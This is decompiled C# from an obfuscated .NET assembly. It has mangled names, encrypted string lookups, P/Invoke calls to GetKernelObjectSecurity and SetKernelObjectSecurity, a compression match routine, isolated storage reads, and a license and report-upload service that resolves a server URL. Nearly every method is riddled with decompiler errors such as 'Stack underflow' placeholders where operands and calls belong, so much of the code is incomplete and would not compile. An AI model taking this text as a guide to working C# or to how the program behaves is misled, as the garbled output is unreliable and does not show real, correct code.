			((global::_0002._0007)/*Error near IL_0009: Stack underflow*/)._0001 = (IWebProxy)/*Error near IL_0009: Stack underflow*/;
		}

		unsafe static int _0001(global::_0008._0004._0007 P_0, int P_1)
		{
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002f: Invalid comparison between Unknown and I4
			//IL_0034: Unknown result type (might be due to invalid IL or missing references)
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 2
			int num;
			while (true)
			{
				num = 8;
				if (num == 0)
				{
					break;
				}
				void* ptr = stackalloc byte[num];
				try
				{
					do
					{
						*(int*)(nint)/*Error near IL_0013: Stack underflow*/ = 0;
					}
					while (false);
					while ((int)/*Error near IL_0031: Stack underflow*/ >= 4)
					{
						if (6u != 0)
						{
							int num2 = *(int*)(nint)/*Error near IL_0020: Stack underflow*/;
							*(int*)(nint)/*Error near IL_0023: Stack underflow*/ = num2 + 2;
						}
						do
						{
							_ = /*Error near IL_0027: Stack underflow*/>> 1;
						}
						while (false);
						P_1 = (int)/*Error near IL_004b: Stack underflow*/;
					}
					_ = /*Error near IL_0035: Stack underflow*/+ 4;
					int num3 = *(int*)(nint)/*Error near IL_0038: Stack underflow*/;
					*(int*)(nint)/*Error near IL_003b: Stack underflow*/ = num3 + P_1;
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)(*(int*)ptr), (object)P_0, (object)P_1);
					throw;
				}
				if (7u != 0)
				{
					num = *(int*)((byte*)ptr + 4);
					break;
				}
			}
			return num;
		}

		[DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
		static extern bool _0001(IntPtr _0002, int _0003, [Out] byte[] _0004, uint _0005, out uint _0006);

		unsafe static bool _0001()
		{
			//IL_0034: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_003c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_0049: Unknown result type (might be due to invalid IL or missing references)
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0069: Unknown result type (might be due to invalid IL or missing references)
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_0080: Incompatible stack heights: 0 vs 1
			void* ptr = default(void*);
			global::_0004._0010 obj = default(global::_0004._0010);
			do
			{
				if (false || 4 == 0)
				{
					continue;
				}
				ptr = stackalloc byte[2];
				try
				{
					new global::_0004._0010();
					obj = (global::_0004._0010)/*Error near IL_007a: Stack underflow*/;
					try
					{
						_ = _0091_0002._007E_0018_0005;
						/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/);
						_ = _0091_0002._007E_0019_0005;
						/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/);
						bool num = (int)/*Error near IL_0036: Stack underflow*/ == 6;
						*(bool*)(nint)/*Error near IL_0037: Stack underflow*/ = num;
					}
					finally
					{
						if (obj != null)
						{
							goto IL_0053;
						}
						goto IL_005f;
						IL_005f:
						while (4u != 0)
						{
							if (false)
							{
								continue;
							}
							goto end_IL_0050;
						}
						goto IL_0053;
						IL_0053:
						global::_000F._007E_0099(obj);
						goto IL_005f;
						end_IL_0050:;
					}
					*(sbyte*)(nint)(/*Error near IL_006a: Stack underflow*/ + 1) = *(sbyte*)ptr;
				}
				catch (Exception ex)
				{
					_0011._0001(ex, (object)obj, (object)(*(bool*)ptr));
					throw;
				}
			}
			while (7 == 0);
			return ((byte*)ptr)[1] != 0;
		}

		static global::_0008._0004._0004 _0001(global::_0008._0004._0005 P_0)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			byte[] array2 = default(byte[]);
			try
			{
				byte[] array = new byte[((global::_0008._0004._0005)/*Error near IL_0007: Stack underflow*/)._0003];
				if (4u != 0)
				{
					array2 = array;
				}
				global::_0008._0004._0004 result = default(global::_0008._0004._0004);
				if (6u != 0)
				{
					_ = ((global::_0008._0004._0005)/*Error near IL_001a: Stack underflow*/)._0002;
					_ = ((global::_0008._0004._0005)/*Error near IL_0021: Stack underflow*/)._0002;
					_ = 0;
					Array.Copy(length: ((global::_0008._0004._0005)/*Error near IL_002b: Stack underflow*/)._0003, sourceArray: (Array)/*Error near IL_004e: Stack underflow*/, sourceIndex: (int)/*Error near IL_004e: Stack underflow*/, destinationArray: (Array)/*Error near IL_004e: Stack underflow*/, destinationIndex: (int)/*Error near IL_004e: Stack underflow*/);
					if (0 == 0)
					{
						new global::_0008._0004._0004((byte[])/*Error near IL_0058: Stack underflow*/);
						return (global::_0008._0004._0004)/*Error near IL_0034: Stack underflow*/;
					}
					return result;
				}
				return result;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array2, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0008._0004._000F P_0, int P_1)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_002c: Expected I4, but got Unknown
			try
			{
				do
				{
					_0011._0001((global::_0008._0004._000F)/*Error near IL_001f: Stack underflow*/, (int)/*Error near IL_001f: Stack underflow*/);
					_003F val = /*Error near IL_000d: Stack underflow*/>> 16;
					_0011._0001((global::_0008._0004._000F)/*Error near IL_002c: Stack underflow*/, (int)val);
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0008._0004._0007 P_0)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					if (true)
					{
						((global::_0008._0004._0007)/*Error near IL_000b: Stack underflow*/)._0001 = 0;
					}
				}
				while (false);
				((global::_0008._0004._0007)/*Error near IL_0016: Stack underflow*/)._0002 = 0;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static void _0001(IWebProxy P_0, global::_0006._0008 P_1)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_000f: Incompatible stack heights: 0 vs 1
			try
			{
				((global::_0006._0008)/*Error near IL_0009: Stack underflow*/)._0001 = (IWebProxy)/*Error near IL_0009: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_1, (object)P_0);
				throw;
			}
		}

		static string _0001(Version P_0)
		{
			//IL_0061: Incompatible stack heights: 0 vs 2
			//IL_0064: Incompatible stack heights: 0 vs 5
			//IL_006b: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 4
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 4
			//IL_007f: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 4
			//IL_0089: Incompatible stack heights: 0 vs 1
			_ = _001A._0099_0002;
			global::_000E._0003._0001(107393947);
			_ = new object[4];
			_ = 0;
			_ = global::_0001._007E_0002;
			/*Error near IL_006b: Stack underflow*/((object)/*Error near IL_006b: Stack underflow*/);
			object obj = (int)/*Error near IL_0022: Stack underflow*/;
			((object[])/*Error near IL_0023: Stack underflow*/)[/*Error near IL_0023: Stack underflow*/] = obj;
			/*Error near IL_0023: Stack underflow*/;
			_ = 1;
			_ = global::_0001._007E_0003;
			/*Error near IL_0075: Stack underflow*/((object)/*Error near IL_0075: Stack underflow*/);
			object obj2 = (int)/*Error near IL_0033: Stack underflow*/;
			((object[])/*Error near IL_0034: Stack underflow*/)[/*Error near IL_0034: Stack underflow*/] = obj2;
			/*Error near IL_0034: Stack underflow*/;
			_ = 2;
			_ = global::_0001._007E_0004;
			/*Error near IL_007f: Stack underflow*/((object)/*Error near IL_007f: Stack underflow*/);
			object obj3 = (int)/*Error near IL_0044: Stack underflow*/;
			((object[])/*Error near IL_0045: Stack underflow*/)[/*Error near IL_0045: Stack underflow*/] = obj3;
			/*Error near IL_0045: Stack underflow*/;
			_ = 3;
			_ = global::_0001._007E_0005;
			/*Error near IL_0089: Stack underflow*/((object)/*Error near IL_0089: Stack underflow*/);
			object obj4 = (int)/*Error near IL_0055: Stack underflow*/;
			((object[])/*Error near IL_0056: Stack underflow*/)[/*Error near IL_0056: Stack underflow*/] = obj4;
			return /*Error near IL_005b: Stack underflow*/((string)/*Error near IL_005b: Stack underflow*/, (object[])/*Error near IL_005b: Stack underflow*/);
		}

		static void _0001(global::_0007._0004 P_0, ThreadStart P_1)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (0 == 0)
				{
				}
				while (8u != 0)
				{
					new Thread((ThreadStart)/*Error near IL_0033: Stack underflow*/);
					((global::_0007._0004)/*Error near IL_0012: Stack underflow*/)._0001 = (Thread)/*Error near IL_0012: Stack underflow*/;
					if (false)
					{
						break;
					}
					_ = global::_000F._007E_009F;
					Thread thread = ((global::_0007._0004)/*Error near IL_0021: Stack underflow*/)._0001;
					/*Error near IL_003d: Stack underflow*/(thread);
					if (8u != 0)
					{
						return;
					}
				}
			}
		}

		[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
		static extern IntPtr _0001();

		static string _0001(int P_0)
		{
			//IL_0032: Incompatible stack heights: 0 vs 2
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 2
			//IL_007b: Incompatible stack heights: 0 vs 1
			object obj = default(object);
			string value = default(string);
			string text = default(string);
			try
			{
				obj = global::_000E._0003._0001;
				_ = _0092_0002._001B_0005;
				/*Error near IL_0075: Stack underflow*/((object)/*Error near IL_0075: Stack underflow*/);
				try
				{
					_ = global::_000E._0003._0001;
					((Dictionary<int, string>)/*Error near IL_0039: Stack underflow*/).TryGetValue((int)/*Error near IL_0039: Stack underflow*/, out value);
					if ((int)/*Error near IL_0026: Stack underflow*/ != 0 || 5 == 0)
					{
						text = (string)/*Error near IL_0042: Stack underflow*/;
						return text;
					}
				}
				finally
				{
					do
					{
						if (0 == 0)
						{
							_0092_0002._001C_0005(obj);
						}
					}
					while (2 == 0);
				}
				return _0011._0001((int)/*Error near IL_005d: Stack underflow*/);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, obj, (object)value, (object)text, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0002._0008 P_0, bool P_1)
		{
			//IL_0032: Incompatible stack heights: 0 vs 2
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (0 == 0)
				{
					_ = _0084_0002._007E_0091_0004;
					_ = ((global::_0002._0008)/*Error near IL_000f: Stack underflow*/)._0001;
					/*Error near IL_003c: Stack underflow*/((object)/*Error near IL_003c: Stack underflow*/, (byte)/*Error near IL_003c: Stack underflow*/ != 0);
				}
				while (true)
				{
					((global::_0002._0008)/*Error near IL_001b: Stack underflow*/)._0001 = 0;
					if (7 == 0)
					{
						break;
					}
					if (8u != 0)
					{
						_ = global::_000F._007E_0001_0002;
						if (0 == 0)
						{
							/*Error near IL_0049: Stack underflow*/((object)/*Error near IL_0049: Stack underflow*/);
						}
						if (0 == 0)
						{
							return;
						}
					}
				}
			}
		}

		static void _0001(_0006 P_0, bool P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((_0006)/*Error near IL_0009: Stack underflow*/)._0003 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
		}

		static bool _0001(global::_0008._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0008._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static Dictionary<string, ulong> _0001(_000E P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				Dictionary<string, ulong> dictionary = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (Dictionary<string, ulong>)/*Error near IL_001c: Stack underflow*/;
		}

		static ulong[] _0001(string P_0)
		{
			//IL_006d: Incompatible stack heights: 0 vs 2
			//IL_0074: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 2
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0080: Incompatible stack heights: 0 vs 2
			//IL_0096: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 1
			IsolatedStorageFileStream isolatedStorageFileStream = default(IsolatedStorageFileStream);
			byte[] array = default(byte[]);
			ulong[] array2 = default(ulong[]);
			try
			{
				new IsolatedStorageFileStream(mode: FileMode.OpenOrCreate, access: FileAccess.Read, share: FileShare.None, isf: global::_0002._000E._0001, path: (string)/*Error near IL_00a0: Stack underflow*/);
				isolatedStorageFileStream = (IsolatedStorageFileStream)/*Error near IL_00a6: Stack underflow*/;
				try
				{
					if (false)
					{
						goto IL_0059;
					}
					_ = _008A._007E_0010_0003;
					/*Error near IL_0074: Stack underflow*/((object)/*Error near IL_0074: Stack underflow*/);
					array = new byte[checked((nint)/*Error near IL_0024: Stack underflow*/)];
					if (4u != 0)
					{
						_ = _008C._007E_0012_0003;
						_ = 0;
						IntPtr intPtr = (nint)((Array)/*Error near IL_003b: Stack underflow*/).LongLength;
						nint num = /*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/, (byte[])/*Error near IL_0041: Stack underflow*/, (int)/*Error near IL_0041: Stack underflow*/, (int)(nint)intPtr);
						if (0 == 0)
						{
							if (false)
							{
								goto IL_0059;
							}
							num = (nint)array.LongLength;
						}
						nint num3;
						while (true)
						{
							int num2 = (int)num;
							num = num2;
							num3 = num2;
							while (0 == 0)
							{
								num3 = num / 8;
								if (8u != 0)
								{
									goto end_IL_004a;
								}
							}
							continue;
							end_IL_004a:
							break;
						}
						array2 = new ulong[num3];
						goto IL_0059;
					}
					goto end_IL_0017;
					IL_0059:
					_0093_0002._001E_0005(array, 0, array2, 0, array.Length);
					end_IL_0017:;
				}
				finally
				{
					if (isolatedStorageFileStream != null)
					{
						global::_000F._007E_0099(isolatedStorageFileStream);
					}
				}
				return array2;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array2, (object)isolatedStorageFileStream, (object)array, (object)P_0);
				throw;
			}
		}

		unsafe static bool _0001(global::_0008._0004._0008 P_0, int P_1)
		{
			//IL_0043: Unknown result type (might be due to invalid IL or missing references)
			//IL_02d5: Incompatible stack heights: 0 vs 1
			//IL_02db: Incompatible stack heights: 0 vs 1
			//IL_02e7: Incompatible stack heights: 0 vs 1
			//IL_02f3: Incompatible stack heights: 0 vs 1
			//IL_02f9: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[23];
			int num = default(int);
			short[] array = default(short[]);
			int num2 = default(int);
			int num5 = default(int);
			try
			{
				num = 128;
				*(int*)(nint)/*Error near IL_001f: Stack underflow*/ = 128;
				array = ((global::_0008._0004._0008)/*Error near IL_0029: Stack underflow*/)._0002;
				num2 = ((global::_0008._0004._0008)/*Error near IL_0038: Stack underflow*/)._0005;
				_ = /*Error near IL_0044: Stack underflow*/+ 4;
				int num3 = ((global::_0008._0004._0008)/*Error near IL_004e: Stack underflow*/)._0005;
				int num4 = P_0._0003;
				*(int*)(nint)/*Error near IL_0056: Stack underflow*/ = num3 + num4;
				*(int*)((byte*)ptr + 8) = Math.Max(P_0._0003, 2);
				*(int*)((byte*)ptr + 12) = Math.Max(P_0._0005 - 32506, 0);
				*(int*)((byte*)ptr + 16) = P_0._0005 + 258 - 1;
				((byte*)ptr)[20] = P_0._0001[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = P_0._0001[*(int*)((byte*)ptr + 4)];
				if (*(int*)((byte*)ptr + 8) >= 8)
				{
					num >>= 2;
				}
				if (*(int*)ptr > P_0._0006)
				{
					*(int*)ptr = P_0._0006;
				}
				do
				{
					if (P_0._0001[P_1 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || P_0._0001[P_1 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || P_0._0001[P_1] != P_0._0001[num2])
					{
						continue;
					}
					while (P_0._0001[P_1 + 1] == P_0._0001[num2 + 1])
					{
						num5 = P_1 + 2;
						num2 += 2;
						while (P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && P_0._0001[++num2] == P_0._0001[++num5] && num2 < *(int*)((byte*)ptr + 16))
						{
						}
						if (num2 > *(int*)((byte*)ptr + 4))
						{
							if (false)
							{
								continue;
							}
							P_0._0002 = P_1;
							*(int*)((byte*)ptr + 4) = num2;
							*(int*)((byte*)ptr + 8) = num2 - P_0._0005;
							if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
							{
								goto end_IL_00cf;
							}
							((byte*)ptr)[20] = P_0._0001[*(int*)((byte*)ptr + 4) - 1];
							((byte*)ptr)[21] = P_0._0001[*(int*)((byte*)ptr + 4)];
						}
						num2 = P_0._0005;
						break;
					}
					continue;
					end_IL_00cf:
					break;
				}
				while ((P_1 = array[P_1 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
				P_0._0003 = Math.Min(*(int*)((byte*)ptr + 8), P_0._0006);
				((byte*)ptr)[22] = ((P_0._0003 >= 3) ? ((byte)1) : ((byte)0));
			}
			catch (Exception ex)
			{
				_0011._0001(ex, new object[13]
				{
					num,
					*(int*)ptr,
					array,
					num2,
					num5,
					*(int*)((byte*)ptr + 4),
					*(int*)((byte*)ptr + 8),
					*(int*)((byte*)ptr + 12),
					*(int*)((byte*)ptr + 16),
					((byte*)ptr)[20],
					((byte*)ptr)[21],
					P_0,
					P_1
				});
				throw;
			}
			return ((byte*)ptr)[22] != 0;
		}

		static bool _0001(global::_0006._0001 P_0, int P_1)
		{
			//IL_000a: Invalid comparison between Unknown and I4
			//IL_0016: Invalid comparison between Unknown and I4
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Incompatible stack heights: 1 vs 2
			//IL_0020: Invalid comparison between Unknown and I4
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			try
			{
				if (2 == 0)
				{
					goto IL_001a;
				}
				if ((int)/*Error near IL_000c: Stack underflow*/ >= 384)
				{
					goto IL_000e;
				}
				goto IL_0026;
				IL_000e:
				int num = 16384;
				goto IL_0013;
				IL_001a:
				num = 8;
				goto IL_001b;
				IL_001b:
				_ = /*Error near IL_001c: Stack underflow*/% num;
				if (false)
				{
					goto IL_0013;
				}
				bool flag = (int)/*Error near IL_0022: Stack underflow*/ == num;
				goto end_IL_0000;
				IL_0026:
				if (0 == 0)
				{
					flag = false;
				}
				if (7 == 0)
				{
					goto IL_000e;
				}
				goto end_IL_0000;
				IL_0013:
				if (num == 0)
				{
					goto IL_001b;
				}
				if ((int)/*Error near IL_0018: Stack underflow*/ <= num)
				{
					goto IL_001a;
				}
				goto IL_0026;
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
			return (byte)/*Error near IL_0051: Stack underflow*/ != 0;
		}

		static RawSecurityDescriptor _0001(IntPtr P_0)
		{
			//IL_0025: Invalid comparison between Unknown and I4
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 1
			//IL_0091: Incompatible stack heights: 0 vs 2
			byte[] array = default(byte[]);
			uint num = default(uint);
			try
			{
				array = new byte[0];
				while (true)
				{
					if (0 == 0)
					{
						_ = 4;
						_0011._0001((IntPtr)/*Error near IL_0078: Stack underflow*/, (int)/*Error near IL_0078: Stack underflow*/, (byte[])/*Error near IL_0078: Stack underflow*/, 0u, out num);
						while (true)
						{
							if (false)
							{
								continue;
							}
							goto IL_0024;
						}
						goto IL_0029;
					}
					goto IL_003a;
					IL_004c:
					if ((int)/*Error near IL_004e: Stack underflow*/ == 0)
					{
						if (false)
						{
							continue;
						}
						throw new Win32Exception();
					}
					return new RawSecurityDescriptor(array, 0);
					IL_003a:
					_ = 4;
					_0011._0001(_0004: array = new byte[/*Error near IL_0042: Stack underflow*/], _0005: num, _0002: (IntPtr)/*Error near IL_004c: Stack underflow*/, _0003: (int)/*Error near IL_004c: Stack underflow*/, _0006: out num);
					goto IL_004c;
					IL_0024:
					if ((int)/*Error near IL_0027: Stack underflow*/ >= 0)
					{
						goto IL_0029;
					}
					break;
					IL_0029:
					if (0 == 0)
					{
						if ((long)(ulong)/*Error near IL_002d: Stack underflow*/ > 32767L)
						{
							break;
						}
						goto IL_003a;
					}
					goto IL_004c;
				}
				new Win32Exception();
				throw /*Error near IL_0038: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)num, (object)(nint)P_0);
				throw;
			}
		}

		static global::_000F._0003 _0001()
		{
			//IL_00c3: Incompatible stack heights: 0 vs 2
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00e5: Incompatible stack heights: 0 vs 1
			//IL_00f1: Incompatible stack heights: 0 vs 1
			//IL_00f7: Incompatible stack heights: 0 vs 2
			Type[] array = default(Type[]);
			if (2u != 0)
			{
				if (global::_000F._0003._0001 == null)
				{
					_ = _0094_0002._007E_007F_0005;
					_0088._000E_0003();
					/*Error near IL_00cd: Stack underflow*/((object)/*Error near IL_00cd: Stack underflow*/);
					array = (Type[])/*Error near IL_00d3: Stack underflow*/;
					goto IL_0026;
				}
				goto IL_00b8;
			}
			goto IL_004c;
			IL_00ac:
			int num = default(int);
			int num2 = num;
			goto IL_00ad;
			IL_0026:
			num2 = 0;
			if (num2 == 0)
			{
				num = num2;
				goto IL_00ac;
			}
			goto IL_00ad;
			IL_004c:
			Type type = default(Type);
			if ((int)/*Error near IL_004e: Stack underflow*/ != 0)
			{
				_ = _008F._007E_008B_0003;
				if ((object)/*Error near IL_005d: Stack underflow*/((object)/*Error near IL_005d: Stack underflow*/) != null && (object)_008F._007E_008B_0003(type) == _001F._009E_0002(typeof(global::_000F._0003).TypeHandle))
				{
					try
					{
						global::_000F._0003._0001 = (global::_000F._0003)_0095_0002._0080_0005(type, true);
						if (global::_000F._0003._0001 != null)
						{
							goto IL_00b8;
						}
					}
					catch
					{
					}
				}
			}
			if (false)
			{
				goto IL_0026;
			}
			num2 = num;
			goto IL_00a6;
			IL_00ad:
			if (false)
			{
				goto IL_00a8;
			}
			if (num2 < array.Length)
			{
				type = (Type)((object[])/*Error near IL_0042: Stack underflow*/)[/*Error near IL_0042: Stack underflow*/];
				goto IL_004c;
			}
			goto IL_00b8;
			IL_00a6:
			num2++;
			goto IL_00a8;
			IL_00b8:
			return global::_000F._0003._0001;
			IL_00a8:
			if (2 == 0)
			{
				goto IL_00a6;
			}
			num = num2;
			goto IL_00ac;
		}

		[DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
		static extern bool _0001(IntPtr _0002, int _0003, [In] byte[] _0004);

		static void _0001(global::_0008._0004._0002 P_0)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0008._0004._0002)/*Error near IL_0009: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0002)/*Error near IL_0010: Stack underflow*/)._0003;
				_003F val = /*Error near IL_0016: Stack underflow*/>> (num & 7);
				((global::_0008._0004._0002)/*Error near IL_001b: Stack underflow*/)._0001 = (uint)(int)val;
				int num2 = ((global::_0008._0004._0002)/*Error near IL_0024: Stack underflow*/)._0003;
				((global::_0008._0004._0002)/*Error near IL_002c: Stack underflow*/)._0003 = num2 & -8;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static void _0001()
		{
			try
			{
				try
				{
					global::_0001._0003._0001();
				}
				catch (Exception)
				{
				}
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2);
				throw;
			}
		}

		static void _0001(_0008 P_0, string P_1)
		{
			//IL_0039: Invalid comparison between Unknown and I4
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_00a0: Incompatible stack heights: 0 vs 2
			//IL_00b0: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 2
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			((_0008)/*Error near IL_000f: Stack underflow*/)._0001 = (string)/*Error near IL_000f: Stack underflow*/;
			_ = _0084_0002._007E_0091_0004;
			Timer obj = ((_0008)/*Error near IL_001e: Stack underflow*/)._0001;
			/*Error near IL_00aa: Stack underflow*/(obj, false);
			_ = global::_0001._007E_0001;
			/*Error near IL_00c0: Stack underflow*/((object)/*Error near IL_00c0: Stack underflow*/);
			if ((int)/*Error near IL_003b: Stack underflow*/ <= 0)
			{
				global::_000E._0003._0001(107393870);
			}
			else
			{
				global::_000E._0003._0001(107393865);
			}
			Bitmap obj2 = _0011._0001((string)/*Error near IL_0056: Stack underflow*/);
			((_0008)/*Error near IL_005b: Stack underflow*/)._0001 = (Image)(object)obj2;
			P_0._0002 = true;
			if (uint.MaxValue != 0)
			{
				P_0._0001 = true;
			}
			if (global::_0001._007E_0001(P_1) > 0)
			{
				_0090_0002._0015_0005(P_0, 100);
			}
			global::_000F._007E_0001_0002(P_0);
		}

		static void _0001(global::_0006._0008 P_0, global::_0001._0006 P_1)
		{
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00bd: Incompatible stack heights: 0 vs 1
			//IL_00c3: Incompatible stack heights: 0 vs 2
			//IL_00c9: Incompatible stack heights: 0 vs 1
			//IL_00d9: Incompatible stack heights: 0 vs 1
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_0143: Incompatible stack heights: 0 vs 1
			UploadReportLoginService1 uploadReportLoginService = default(UploadReportLoginService1);
			Exception ex2 = default(Exception);
			try
			{
				if (((global::_0006._0008)/*Error near IL_000a: Stack underflow*/)._0003 == null)
				{
					try
					{
						new UploadReportLoginService1();
						uploadReportLoginService = (UploadReportLoginService1)/*Error near IL_00b7: Stack underflow*/;
						if (((global::_0006._0008)/*Error near IL_0023: Stack underflow*/)._0001 != null)
						{
							_ = _0096_0002._007E_0081_0005;
							IWebProxy webProxy = ((global::_0006._0008)/*Error near IL_0039: Stack underflow*/)._0001;
							/*Error near IL_00d3: Stack underflow*/((object)/*Error near IL_00d3: Stack underflow*/, webProxy);
						}
						string licenseID = P_0._0002;
						string serverURL = ((UploadReportLoginService1)/*Error near IL_0053: Stack underflow*/).GetServerURL(licenseID);
						((global::_0006._0008)/*Error near IL_0058: Stack underflow*/)._0003 = serverURL;
						int num = global::_0001._007E_0001(P_0._0003);
						while (true)
						{
							if (num == 0)
							{
								if (false)
								{
									break;
								}
								if (0 == 0)
								{
									throw new ApplicationException(global::_000E._0003._0001(107393856));
								}
							}
							num = (global::_0008._0095(P_0._0003, global::_000E._0003._0001(107393847)) ? 1 : 0);
							if (7u != 0)
							{
								if (num != 0)
								{
									P_0._0003 = global::_0006._0008._0001;
								}
								break;
							}
						}
					}
					catch (Exception ex)
					{
						ex2 = ex;
						P_1(global::_0004._0019(global::_000E._0003._0001(107393806), global::_0007._007E_008D(ex2)));
						return;
					}
				}
				P_1(_000E_0002._007E_0014_0004(P_0._0003, global::_000E._0003._0001(107393821)) ? P_0._0003 : global::_000E._0003._0001(107393816));
			}
			catch (Exception ex3)
			{
